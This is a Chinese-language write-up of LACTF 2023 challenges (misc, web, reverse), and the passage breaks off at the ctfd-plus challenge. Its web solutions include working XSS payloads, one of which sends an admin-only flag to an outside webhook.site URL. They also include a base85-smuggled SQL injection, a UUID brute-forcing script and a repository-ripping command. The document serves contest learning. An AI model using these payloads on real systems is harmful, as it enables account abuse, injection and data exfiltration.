# LACTF 2023 Co-Pen
###### tags: `CTF`

## Misc
### CATS!

會先拿到一張貓咪照片
題目有說拿到這張圖片的拍攝地點然後找到網站塞入 lactf{} 當中

直接 exiftool 會拿到很多資訊 看到重點

```
GPS Latitude                    : 20 deg 47' 27.52" N
GPS Latitude Ref                : North
GPS Longitude                   : 156 deg 57' 50.03" W
GPS Longitude Ref               : West
GPS Position                    : 20 deg 47' 27.52" N, 156 deg 57' 50.03" W
```

用 GPS Coordinates Location 找

![](https://i.imgur.com/IIEdvIj.png)

會找到一間貓咪網站 https://lanaicatsanctuary.org/
> flag : `lactf{lanaicatsanctuary.org}`

### EBE
```!
I was trying to send a flag to my friend over UDP, one character at a time, but it got corrupted! I think someone else was messing around with me and sent extra bytes, though it seems like they actually abided by RFC 3514 for once. Can you get the flag?
```
附件: `EBE.pcap`

由題目敘述來看，可知 flag 會一個一個字元進行傳送，但是中間有其他干擾，另外也有提到關鍵字 RFC3514

搜尋一下可以看到 [RFC](https://www.ietf.org/rfc/rfc3514.txt) 和 [wiki](https://en.wikipedia.org/wiki/Evil_bit)，總之就是有一個愚人節彩蛋在 ipv4 的一個 bit 上面

打開 pcap，可以看到有些 packet 在 ipv4 的 reverse bit 上為 1，有些為 0，可推測為 1 的就是上面說的干擾的封包

![](https://i.imgur.com/Sj2f0An.png)
![](https://i.imgur.com/wdb4b1x.png)

只要下 filter 為 `ip.flags.rb == 0`，即可過濾出 flag 封包

另外我寫了一個腳本來自動印出 flag

:::spoiler solve.py
```python
import pyshark

cap = pyshark.FileCapture("./EBE.pcap", display_filter="ip.flags.rb == 0")

flag = b""
for packet in cap:
    word = bytes.fromhex(packet.DATA.data)
    flag += word

print(flag)
```
:::

`lactf{3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c}`

### (X)discord l34k
```
My friend sent me this message link that apparently links to a "flag", but discord says "You don't have access to this link"! They did mention something about them being able to embed a list of online users on their own website, and sent me this image. Can you figure out how to join the server?

Note: Discord phone verification is NOT required for this challenge.
```
Link: `https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186`
附件:
![](https://i.imgur.com/bXzfSD9.png =400x)

以下參考[這篇 wu](https://github.com/dreeSec/la-ctf-2023/blob/master/LA-CTF-2023.md#miscdiscord-l34k)

可以看到提示的部分是 discord widget (小工具)

參考[這篇文章留言](https://www.reddit.com/r/discordapp/comments/vwzj18/comment/ifuflxt/?utm_source=share&utm_medium=web2x&context=3)，可以看到只要知道 discord server id 且在 widget 有啟用的情況下，可以利用 `https://discord.com/widget?id=???` 這樣子的連結取得 widget，也就是圖片中的視窗

更進一步，如果有設定邀請頻道的話，在 widget 中會有加入的按鈕，如圖片中右下角的部分

從圖片中可以知道以上功能應該是都有開啟，所以只要知道 server id 即可加入，而連結中的 `channels` 後面那一項就是 server id

因此以下是 widget 的連結: https://discord.com/widget?id=1060030874722259057
以下是邀請的連結: https://discord.com/invite/XY7MM3zk?utm_source=Discord%20Widget&utm_medium=Connect

進入後的第一個訊息中就含有 flag

![](https://i.imgur.com/EXdtOHR.png)

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{D15C0rD_W1D6375_134K_1NV1735}`

### (X)hidden in plain sheets
```
I found this google sheets link on the internet. I'm sure it's hiding something, but I can't find anything? Can you find the flag?

Choose any link (they're all the same): Link 1 Link 2 Link 3
```
[連結](https://docs.google.com/spreadsheets/d/1OYx3lCccLKYgOvzxkRZ5-vAwCn3mOvGUvB4AdnSbcZ4/edit)

可以看到，試算表中只有兩列，沒有其他東西了

![](https://i.imgur.com/TTbdWwK.png)

而查看其他資料表時發現有一個隱藏且受保護的試算表 `flag`，無法點進去看

![](https://i.imgur.com/j5o7tIr.png)

以下參考[這篇 wu](https://hackmd.io/@lamchcl/r1zQkbvpj#mischidden-in-plain-sheets)

嘗試使用其他方式 leak 出資料，在 google sheet 中發現了以下的函式

![](https://i.imgur.com/8Fefwiz.png)

![](https://i.imgur.com/xrUdlTu.png)

輸入以下公式
```!
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/1OYx3lCccLKYgOvzxkRZ5-vAwCn3mOvGUvB4AdnSbcZ4/edit", "flag!A1:AZ100")
```

發現 flag 被分布到各個儲存格中

![](https://i.imgur.com/42qK98Q.png)

使用 concatanate 連接起來
```
=CONCATENATE(A1:AZ1)
```

![](https://i.imgur.com/4QhVwzK.png)

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{H1dd3n_&_prOt3cT3D_5h33T5_Ar3_n31th3r}`

## Web
### college-tour
```!
Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.
```
[網頁連結](https://college-tour.lac.tf)

進入網頁後是一個介紹介面，並且可以看到需要尋找六個長得像是 flag 格式的東東，拼湊起來拿到 flag

![](https://i.imgur.com/lpkxsyU.png)

首先檢查網頁原始碼，發現有自訂的 css 和 js 外，也發現了 1,2,4 號片段 (註解、img alt、iframe src)

:::spoiler index.html
```htmlembedded
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>A tour of UCLA</title>
    <link rel="stylesheet" href="index.css">
    <script src="script.js"></script>
</head>
<body>
    <h1>A tour of UCLA</h1>
    <button id="dark_mode_button" onclick="dark_mode()">Click me for Light Mode!</button>
    <p> (...省略...) </p>
    <!-- lactf{1_j03_4}-->
    <img src="royce.jpg" alt="lactf{2_nd_j0}" height="400px">
    <iframe src="lactf{4_n3_bR}.pdf" width="100%" height="500px">
    </iframe>
</body>
```
:::

接下來檢查 css，用搜尋發現了 3 號片段 (`.secret` 的 font-family)

:::spoiler index.css
```css
(...省略...)

.dark-mode {
    background-color: white;
    color: black;
}

.secret {
    font-family: "lactf{3_S3phI}"
}

h1, h2, h3 {
	font-family: 'Poppins', sans-serif;
	color: #ffba44;
}

(...省略...)
```
:::

接下來查看 js，發現了 5,6 號片段 (`dark_mode()` 的 else、load event set cookie)

:::spoiler script.js
```javascript
let dark = 1;

function dark_mode() {
    dark = 1 - dark;
    var element = document.body;
    element.classList.toggle("dark-mode");
    if (dark === 1) {
        document.getElementById("dark_mode_button").textContent = "Click me for Light Mode!";
    }
    else if (dark === 0) {
        document.getElementById("dark_mode_button").textContent = "Click me for Dark Mode!";
    }
    else {
        document.getElementById("dark_mode_button").textContent = "Click me for lactf{6_AY_hi} Mode!";
    }
}

window.addEventListener("load", (event) => {
    document.cookie = "cookie=lactf{5_U1n_s}";
});
```
:::

綜合以上，以下是所有找到的片段

```
lactf{1_j03_4}
lactf{2_nd_j0}
lactf{3_S3phI}
lactf{4_n3_bR}
lactf{5_U1n_s}
lactf{6_AY_hi}
```

拼起來拿到 flag

`lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}`

### metaverse
```!
Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.

metaverse.lac.tf

You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!
```
附件: `index.js`
[網頁連結](https://metaverse.lac.tf/)
[bot 連結](https://admin-bot.lac.tf/metaverse)

很明顯的，這題是前端題

這是一個交朋友的網頁，需要雙方都同意邀請才能成為朋友，此外有一個可以發文的功能

首先先看到 index.js 的前面部分，如下

:::spoiler index.js
```javascript
const flag = process.env.FLAG;
const adminpw = process.env.ADMINPW || "placeholder";

const accounts = new Map();
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
```
:::

可以看到 flag 為 admin 的暱稱，因此推測這題是要想辦法讓 admin 自動加我們好友

接著直接看有問題的部分

:::spoiler index.js
```javascript
app.post("/post", needsAuth, (req, res) => {
    res.type("text/plain");
    const id = uuid();
    const content = req.body.content;
    if (typeof content !== "string" || content.length > 1000 || content.length === 0) {
        res.status(400).send("Invalid metacontent");
    } else {
        const user = accounts.get(res.locals.user);
        posts.set(id, content);
        user.posts.push(id);
        res.send(id);
    }
});

app.get("/posts", needsAuth, (req, res) => {
    res.type("application/json");
    res.send(
        JSON.stringify(
            accounts.get(res.locals.user).posts.map((id) => {
                const content = posts.get(id);
                return {
                    id,
                    blurb: content.length < 50 ? content : content.slice(0, 50) + "...",
                };
            })
        )
    );
});
```
:::

可以看到貼文部分沒有做 sanitize XSS 的部分，也沒有 CSP，所以很明顯的可以做 xss

可以利用以下 payload 進行測試

```htmlembedded
</p><script>alert(1);</script>
```
[連結](https://metaverse.lac.tf/post/29a20067-3d0e-466f-a588-87252799bba9)

![](https://i.imgur.com/nYMHjwX.png)

因此我們可以構造 xss payload，用 fetch 產生 post request 加我們好友 (request 部分參考原網站的 js 部分)

```htmlembedded!
</p><script>fetch("/friend", {method: "POST",body: "username=ywc",headers: {"Content-Type": "application/x-www-form-urlencoded"}})</script>
```
[連結](https://metaverse.lac.tf/post/c78e6a28-4c58-4607-bd29-72308aae59e7)

其中的 `username` 換掉即可變成加其他人好友

![](https://i.imgur.com/C1oFLYa.png)

`lactf{please_metaget_me_out_of_here}`

### uuid hell
```!
UUIDs are the best! I love them (if you couldn't tell)!

Site: uuid-hell.lac.tf
```
附件: `uuid-hell.zip`
[網頁連結](https://uuid-hell.lac.tf/)

首先來看 source code

:::spoiler server.js
```javascript
const uuid = require('uuid');
const crypto = require('crypto')

function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}
let adminuuids = []
let useruuids = []
function isAdmin(uuid) {
    return adminuuids.includes(uuid);
}
function isUuid(uuid) {
    if (uuid.length != 36) {
        return false;
    }
    for (const c of uuid) {
        if (!/[-a-f0-9]/.test(c)) {
            return false;
        }
    }
    return true;
}

function getUsers() {
    let output = "<strong>Admin users:</strong>\n";
    adminuuids.forEach((adminuuid) => {
        const hash = crypto.createHash('md5').update("admin" + adminuuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    output += "<br><br><strong>Regular users:</strong>\n";
    useruuids.forEach((useruuid) => {
        const hash = crypto.createHash('md5').update(useruuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    return output;

}

const express = require('express');
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser());



app.get('/', (req, res) => {
    let id = req.cookies['id'];
    if (id === undefined || !isUuid(id)) {
        id = randomUUID();
        res.cookie("id", id);
        useruuids.push(id);
    } else if (isAdmin(id)) {
        res.send(process.env.FLAG);
        return;
    }

    res.send("You are logged in as " + id + "<br><br>" + getUsers());
});

app.post('/createadmin', (req, res) => {
    const adminid = randomUUID();
    adminuuids.push(adminid);
    res.send("Admin account created.")
});

app.listen(process.env.PORT);
```
:::

可以看到這題的目標是需要我們想辦法修改 cookie 成為任一個 admin，即可在 `/` 的 endpoint 下取得 flag

可以看到，admin 所需要的 credential 是 uuid，而從 randomUUID 的函式可以看到所使用的是 UUID v1，從[文件](https://www.npmjs.com/package/uuid?activeTab=readme#uuidv1options-buffer-offset)可看到 v1 為 timestamp relavent，而另外也可看到有設定 node 和 clockseq，代表 UUID 有後面幾碼可能會是一樣的
 
因此我們可以嘗試在生產 admin 的幾乎同時也順便產生一組 uuid，並一一爆破找出可能符合的 admin uuid

:::spoiler solve.py
```python
from hashlib import md5
import uuid
import requests

def gen_uuid() -> uuid.UUID:
    return uuid.uuid1(node=0x67696e6b6f69, clock_seq=0b10101001100100)
def parse_admins(text):
    admin_raw = text.split("<strong>")[1][30:-19]
    admin_list = admin_raw.split("</td></tr>\n<tr><td>")
    return admin_list

res = requests.post("https://uuid-hell.lac.tf/createadmin")
id = gen_uuid()
res = requests.post("https://uuid-hell.lac.tf/createadmin")
res = requests.get('https://uuid-hell.lac.tf/', cookies={"id":"404d89e0-aa37-11ed-aa64-67696e6b6f69"})
admin_list = parse_admins(res.text)

print(id)
print(admin_list[-1])

dt = 0
aim = 10
while(True):
    new_uuid_list = str(id).split("-")
    num = int(new_uuid_list[0], base=16)
    num += dt
    if(num > 0xffffffff):
        print("Error")
        exit(1)
    new_uuid_list[0] = hex(num)[2:]
    new_uuid = "-".join(new_uuid_list)
    # print(new_uuid)
    # break
    if(md5(b"admin"+new_uuid.encode()).hexdigest() in admin_list):
        print("UUID:", new_uuid)
        break
    dt += 1
    if(dt >= aim):
        print(dt, new_uuid)
        if(aim < 10000000):
            aim *= 10
        else:
            aim += 10000000

res = requests.get('https://uuid-hell.lac.tf/', cookies={"id":new_uuid})
print(res.text)
```
:::

要注意的是，admin 的 md5 有 `admin` 的前綴

經過爆破大約 1000000 ~ 10000000 個 iteration 即可成功拿到一個符合的 uuid，如 `18a954a0-aa41-11ed-aa64-67696e6b6f69`

`lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}`

### (X)my-chemical-romance
```
When I was... a young boy... I made a "My Chemical Romance" fanpage!
```
[連結](https://my-chemical-romance.lac.tf/)

點進去網站後，發現檢測原始碼洩漏的瀏覽器擴充 DotGit 發現了 .hg 洩漏

![](https://i.imgur.com/RaUWh8t.png)

參考[這篇文章](https://ithelp.ithome.com.tw/articles/10267051?sc=rss.iron)，使用 dvcs-ripper 工具嘗試取出原始碼

首先先 `hg init` 產生 hg 的 repository，接著輸入以下指令，取得資料

```bash
~/dvcs-ripper/rip-hg.pl -v -u https://my-chemical-romance.lac.tf/.hg/
```
![](https://i.imgur.com/B1X5KIr.png)

可以發現中間有一個檔案 `gerard_way2001.py` 找不到，無法下載

後來參考[這篇 wu](https://siunam321.github.io/ctf/LA-CTF-2023/Web/my-chemical-romance/)以及以下留言，發現是因為 Mercurial 使用 `_` 來跳脫特殊字元，所以正確的檔案名稱應該會是 `gerard__way2001.py` (注意中間是兩個 `_`)

![](https://i.imgur.com/XuMvE1G.png =500x)

使用手動的方式下載~~此檔案~~ `gerard__way2001.py.i`，是 `.i` 的原因是在 `.hg/store/fncache` 裡面是真正儲存的檔案名稱，如下，可以看到此項目是 `.i` 檔案

```
data/static/404.html.i
data/static/mcr-meme.jpeg.i
data/static/index.css.i
data/gerard_way2001.py.i
data/static/my-chemical-romance.jpeg.i
data/static/index.html.i
data/static/my-chemical-romance.jpeg.d
```

檔案取回來後，在 `hg log` 的部分可以看到有兩個 commit，而可以看到目前的 commit log 是 `Decided to keep my favorite song a secret :D`，所以可以推測前一個 commit 含有 secret

![](https://i.imgur.com/8q3wyEl.png =500x)

使用 `hg diff -r 0 -r 1` 查看兩個 commit 之間的差異

![](https://i.imgur.com/Hjnw01C.png =500x)

在 `gerard_way2001.py` 看到了 flag

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{d0nT_6r1nk_m3rCur1al_fr0m_8_f1aSk}`

### (X)85_reasons_why
```!
If you wanna catch up on ALL the campus news, check out my new blog. It even has a reverse image search feature!
```
[連結](https://85-reasons-why.lac.tf/)
附件: `src.tar.gz`

點進網頁，可以看到這是一個 blog 網站，且基本上只有 Home, Search, About 三個功能

![](https://i.imgur.com/Go4DkF7.png =500x)

基本上 Home 和 About 都沒有可操作的點，所以基本上對這題來說沒有用

而 search 除了一般的文字搜尋之外，還有一個圖片搜尋的功能

![](https://i.imgur.com/d3dOwL8.png =200x)

在原始碼中的 `app/views.py` 可以看到，圖片會先做檔案大小的檢查後直接進行 serialize，並放入 sql 執行

:::spoiler app/views.py
```python
@app.route('/image-search', methods=['GET', 'POST'])
def image_search():
    if 'image-query' not in request.files or request.method == 'GET':
        return render_template('image-search.html', results=[])

    incoming_file = request.files['image-query']
    size = os.fstat(incoming_file.fileno()).st_size
    if size > MAX_IMAGE_SIZE:
        flash("image is too large (50kb max)");
        return redirect(url_for('home'))

    spic = serialize_image(incoming_file.read())

    try:
        res = db.session.connection().execute(\
            text("select parent as PID from images where b85_image = '{}' AND ((select active from posts where id=PID) = TRUE)".format(spic)))
    except Exception:
        return ("SQL error encountered", 500)

    results = []
    for row in res:
        post = db.session.query(Post).get(row[0])
        if (post not in results):
            results.append(post)

    return render_template('image-search.html', results=results)
```
:::

而以下是 serialize 的程式碼，可以看到基本上就是轉成 base85 字串並做一些過濾取代之類的

:::spoiler app/utils.py
```python
def serialize_image(pp):
    b85 = base64.a85encode(pp)
    b85_string = b85.decode('UTF-8', 'ignore')

    # identify single quotes, and then escape them
    b85_string = re.sub('\\\\\\\\\\\\\'', '~', b85_string)
    b85_string = re.sub('\'', '\'\'', b85_string)
    b85_string = re.sub('~', '\'', b85_string)

    b85_string = re.sub('\\:', '~', b85_string)
    return b85_string
```
:::

首先可以看到，由於程式中沒有檢查圖片格式正確性的部分，因此我們可以將任意 bytes 寫入圖片並上傳

另外可以看到，由於搜尋時是直接將 serialize 過的圖片套進 sql 字串執行而非安全的 prepare 後填入，因此有 sql injection 的漏洞，假如我們能控制讓 serialize 過的字串成為 payload，即可操作我們想要的 sql 命令

而操作 serialize 過的字串也很簡單，只要把想要的指令做 base85 decode 即可，另外由於 serialize 內的取代順序有漏洞，只要輸入 `\\\\\\'`，即會先被第一個代換轉換為 `~` 符號，隨後又會在第三個代換轉換為 `'` 符號，即可產生我們需要的 `'` 符號

此外由於 base85 中沒有 ` `(空白) 的原因，因此 payload 中的空白必需變成 `/**/` 這樣的格式，另外也因為一些解碼上的限制因此 payload 長度必須限定為 5 的倍數

因此我們的 payload 如下
```
\\\\\\'/**/or/**/1=1/**/--/**/
```

轉成 base85 後的 hex 如下
```
b9 c2 0a 5f b7 cc 5c 7d 2e 73 20 9c 1c 85 a8 1b 2b e4 9a b6 25 da 6a 4e
```

[recipe](https://gchq.github.io/CyberChef/#recipe=From_Base85('!-u',true,'z')To_Hex('Space',0)&input=XFxcXFxcJy8qKi9vci8qKi8xPTEvKiovLS0vKiov)

將以上 bytes 塞成一個檔案，並上傳，即可看到隱藏的文章，flag 也在其中

![](https://i.imgur.com/m1Gkiz6.png)

這題我沒有解出來的原因是因為眼殘，沒看到多跑出的這一篇文章 :eyes: 

![](https://i.imgur.com/b38pb82.png =500x)

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{sixty_four_is_greater_than_eigthy_five_a434d1c0e0425c3f}`

### (X)california-state-police
```
Stop! You're under arrest for making suggestive 3 letter acronyms!

california-state-police.lac.tf

Admin Bot (note: the adminpw cookie is HttpOnly and SameSite=Lax)
```
[網頁連結](https://california-state-police.lac.tf/)
[bot](https://admin-bot.lac.tf/california-state-police)
附件: `index.js`

以下是原始碼的片段部分

:::spoiler index.js
```javascript
app.get("/flag", (req, res) => {
    res.status(400).send("you have to POST the flag this time >:)");
});

app.post("/flag", (req, res) => {
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(400).send("no hacking allowed");
    }
});

app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'none'; script-src 'unsafe-inline'"
    );
    next();
});

app.post("/report", (req, res) => {
    res.type("text/plain");
    const crime = req.body.crime;
    if (typeof crime !== "string") {
        res.status(400).send("no crime provided");
        return;
    }
    if (crime.length > 2048) {
        res.status(400).send("our servers aren't good enough to handle that");
        return;
    }
    const id = uuid();
    reports.set(id, crime);
    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
    res.redirect("/report/" + id);
});

app.get("/report/:id", (req, res) => {
    if (reports.has(req.params.id)) {
        res.type("text/html").send(reports.get(req.params.id));
    } else {
        res.type("text/plain").status(400).send("report doesn't exist");
    }
});
```
:::

可以看到，有一個 report 的介面，可以寫入內容給 html 解析，另外也有一個 `/flag` 的 endpoint，如果使用 post 方法進入且有正確的 `adminpw` cookie 的話就能拿到 flag (不過 cookie 有設定 htmlonly 且為 samesite lax，無法直接偷取出來)

不過可以看到網頁中具有 CSP 保護，設定為 `default-src` 為 none 但是 `script-src` 為 unsafe-inline，需要想辦法繞過

由於只有開放 `script-src` 的原因，因此無法使用 `fetch`、`xhr` 之類的東西來送封包，相關權限可以參考[飛飛大佬的介紹](https://ithelp.ithome.com.tw/articles/10223568)

以下參考[這篇官方 wu](https://github.com/uclaacm/lactf-archive/blob/master/2023/web/california-state-police/solve.txt)

回到原始碼部分可以看到，由於 csp 的設定是在 `/flag` endpoint 之後，換言之，`/flag` 的介面是沒有 csp 的，也就可以任意做 xss

但是 `/flag` 介面沒有可以注入的點ㄚ，這就要看到 js 的一個特別的函式 `document.write`，在 [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/write) 中可以看到這是用來在 `document.open` 開啟文件後寫入文字的，所以我們可以利用這一個功能在開啟 `/flag` 後寫入 xss 的 payload，要注意的是 `document.write` 的文件中明確寫到加入 `<script>` 標籤可能會有問題，因此我們需要改用 `<img>` 來執行 js，另外一個注意的點是 `document.open` 是 GET 方法，也就是寫入 `no hacking allowed` 的那個頁面

以下是 xss payload
```javascript!
<script>w=window.open("/flag");w.onload=()=>w.document.write(`<img src="" onerror="fetch('/flag',{method:'POST'}).then(x=>x.text()).then(x=>fetch('https://webhook.site/aeaaaacd-9258-4e20-9128-45466111c311?a='+encodeURIComponent(x)))">`)</script>
```

中間的 webhook 需依情況修改

送出 report 後，將 report 網址給 bot，即可在 webhook 上收 flag

由於比賽已結束，無法確認 flag 正確性，以下 flag 僅供參考

`lactf{m4yb3_g1v1ng_fr33_xss_1s_jus7_4_b4d_1d3a}`

## Reverse
### string-cheese
```!
I'm something of a cheese connoisseur myself. If you can guess my favorite flavor of string cheese, I'll even give you a flag. Of course, since I'm lazy and socially inept, I slapped together a program to do the verification for me.

Connect to my service at `nc lac.tf 31131`

Note: The attached binary is the exact same as the one executing on the remote server.
```
附件: `string_cheese`

根據題目名稱提示，使用 `string` 工具列出檔案中的可讀字元，發現這似乎是一個要我們猜起司口味的東西，並且在使用 strings 的同時也列出了一個像是答案的 `blueberry`，因此推測這是正確答案

```
(...省略...)
flag.txt
Cannot read flag.txt.
What's my favorite flavor of string cheese?
blueberry
...how did you know? That isn't even a real flavor...
Well I guess I should give you the flag now...
Hmm... I don't think that's quite it. Better luck next time!
(...省略...)
```

輸入拿 flag

`lactf{d0n7_m4k3_fun_0f_my_t4st3_1n_ch33s3}`

### caterpillar
```
-~-~-~-~[]? -~-~-~-~[].
```
附件: `caterpillar.js`

:::spoiler caterpillar.js
```javascript
const flag = "lactf{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}";
if (flag.charCodeAt(-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] && (...省略...) && flag.charCodeAt(-~-~-~-~-~[]) == -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]) {
    console.log("That is the flag!");
} else {
    console.log("That is not the flag!");
}

```
:::

總之就是一個檢查密碼的程式，但是裡面檢查邏輯有點像是 jsfuck 那樣子

手動將 `~-~-...[]` 這樣子的東西用 browser 的 console 轉換成數字並整理後，整理如下

:::spoiler prettier.js
```javascript
const flag = "lactf{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}";
if (
    flag.charCodeAt(17) == 108 && 
    flag.charCodeAt(43) == 95 && 
    flag.charCodeAt(21) == 108 && 
    (...省略...)
    flag.charCodeAt(34) == 114 && 
    flag.charCodeAt(24) == 99 && 
    flag.charCodeAt(5) == 123
) {
    console.log("That is the flag!");
} else {
    console.log("That is not the flag!");
}
```
:::

複製到 python 並取代整理後，變成一個解出密碼的程式

:::spoiler solve.py
```python
flag = [0 for _ in range(60)]

flag[17] = 108  
flag[43] = 95  
flag[21] = 108  
(...省略...)
flag[40] = 116  
flag[34] = 114  
flag[24] = 99  
flag[5] = 123

print(bytes(flag))
```
:::

`lactf{th3_hungry_l1ttl3_c4t3rp1ll4r_at3_th3_fl4g_4g41n}`

### finals-simulator
```
Don't you love taking finals? Don't you wish you could do it not only during finals week, but during every week? Fret no more, Finals Simulator 2023 has got your back! If you install now and get an A+ on your simulated final, you'll even get the limited time Flag DLC for free! Also, after numerous reports of cheating we've installed an anti-cheating mechanism so people actually have to solve the problem.

Connect to it at `nc lac.tf 31132`
```
附件: `finals_simulator`

直接丟 ghidra，以下是反編譯後的東西

:::spoiler
```clike
  puts("Welcome to Finals Simulator 2023: Math Edition!");
  printf("Question #1: What is sin(x)/n? ");
  fflush(stdout);
  fgets(local_118,0x100,stdin);
  sVar2 = strcspn(local_118,"\n");
  local_118[sVar2] = '\0';
  iVar1 = strcmp(local_118,"six");
  if (iVar1 == 0) {
    printf("Question #2: What\'s the prettiest number? ");
    fflush(stdout);
    __isoc99_scanf(&DAT_001020c3,&local_11c);
    if ((local_11c + 0x58) * 0x2a == 0x2179556a) {
      printf("Question #3: What\'s the integral of 1/cabin dcabin? ");
      fflush(stdout);
      getchar();
      fgets(local_118,0x100,stdin);
      sVar2 = strcspn(local_118,"\n");
      local_118[sVar2] = '\0';
      for (local_10 = local_118; *local_10 != '\0'; local_10 = local_10 + 1) {
        *local_10 = (char)((*local_10 * 0x11) % mod);
      }
      putchar(10);
      iVar1 = strcmp(local_118,enc);
      if (iVar1 == 0) {
        puts("Wow! A 100%! You must be really good at math! Here, have a flag as a reward.");
        print_flag();
      }
      else {
        puts("Wrong! You failed.");
      }
    }
    else {
      puts("Wrong! You failed.");
    }
  }
  else {
    puts("Wrong! You failed.");
  }
  return 0;
```
:::

可以看到這是一個問答，答對這三題即可拿到 flag

第一題很明顯的答案是 `six`

第二題用 python 算一下，答案是 `13371337`

```python
>>> 0x2179556a // 0x2a - 0x58
13371337
```

第三題用逆模元運算，得出答案為 `it's a log cabin!!!`

```python
>>> a = bytes.fromhex('0e c9 9d b8 26 83 26 41 74 e9 26 a5 83 94 0e 63 37 37 37')
>>> inv = pow(0x11,-1,0xfd)
>>> flag = []
>>> for aa in a:
...     flag.append((aa * inv)%0xfd)
...
>>> bytes(flag)
b"it's a log cabin!!!"
```

輸入拿 flag

`lactf{im_n0t_qu1t3_sur3_th4ts_h0w_m4th_w0rks_bu7_0k}`

### universal
```
3 billion devices run Java...so I guess 3 billion devices can get the flag.
```
附件: `FlagChecker.class`

由題目敘述可知，這題是 java class reverse

直接丟 ghidra，以下是逆出來的東西

:::spoiler
```java
void main_java.lang.String[]_void(String[] param1)

{
  PrintStream pPVar1;
  String objectRef;
  Charset pCVar2;
  byte[] pbVar3;
  Scanner objectRef_00;
  
  pPVar1 = System.out;
  pPVar1.print("What\'s the flag? ");
  pPVar1 = System.out;
  pPVar1.flush();
  objectRef_00 = new Scanner(System.in);
  objectRef = objectRef_00.nextLine();
  objectRef_00.close();
  pCVar2 = Charset.forName("UTF-8");
  pbVar3 = objectRef.getBytes(pCVar2);
  if ((((((((pbVar3.length == 0x26) &&
           ((byte)(pbVar3[0x22] ^ pbVar3[0x17] * 7 ^ (pbVar3[0x24] ^ -1) + 0xd) == -0x4a)) &&
          ((byte)(pbVar3[0x25] ^ pbVar3[10] * 7 ^ (pbVar3[0x15] ^ -1) + 0xd) == -0x21)) &&
        (...省略...)
         ((byte)(pbVar3[0x13] ^ pbVar3[0x1c] * 7 ^ (pbVar3[0x25] ^ -1) + 0xd) == -0x43)) &&
        ((byte)(pbVar3[0x18] ^ pbVar3[9] * 7 ^ (pbVar3[0x11] ^ -1) + 0xd) == -0x47)))))))) {
    pPVar1 = System.out;
    pPVar1.println("Correct!");
    return;
  }
  pPVar1 = System.out;
  pPVar1.println("Not quite...");
  return;
}
```
:::

總之又是一個解密碼題目，而判斷邏輯是用一堆數學計算出來，使用 z3 來解

:::spoiler solve.py
```python
import z3

pbVar3 = z3.Array("pbVar3", z3.BitVecSort(8), z3.BitVecSort(8))
s = z3.Solver()

s.add(pbVar3[0x22] ^ (pbVar3[0x17] * 7) ^ ((pbVar3[0x24] ^ -1) + 0xd) == -0x4a)
s.add(pbVar3[0x25] ^ (pbVar3[10]   * 7) ^ ((pbVar3[0x15] ^ -1) + 0xd) == -0x21)
(...省略...)
s.add(pbVar3[0x13] ^ (pbVar3[0x1c] * 7) ^ ((pbVar3[0x25] ^ -1) + 0xd) == -0x43)
s.add(pbVar3[0x18] ^ (pbVar3[9]    * 7) ^ ((pbVar3[0x11] ^ -1) + 0xd) == -0x47)

print(s.check())
m = s.model()
print(m)
flag = []
for i in range(0x26):
    flag.append(m.eval(pbVar3[i]).as_long())
print(bytes(flag))
```
:::

`lactf{1_d0nt_see_3_b1ll10n_s0lv3s_y3t}`

### ctfd-plus
```
CTFd is too insufferably slow. You know why? Because they use an SQL database that's bogged down by JOINs instead of a web scale database like MongoDB. MongoDB is web scale. You turn it on and it scales right up. You know what's more web scale though? Nothing. That's right, the throughput of /dev/null is off the charts. Behold, CTFd+, the first databaseless CTF platform. Can you get the flag for the only challenge?
```
附件: `ctfd_plus`

打開 ghidra，逆出以下東西

:::spoiler
```clike
undefined8 FUN_00101070(void)

{
  char cVar1;
  size_t sVar2;
  long lVar3;
  undefined4 *puVar4;
  char local_108 [256];
  
  puts("Welcome to CTFd+!");
  puts(
      "So far, we only have one challenge, which is one more than the number of databases we have.\n "
      );
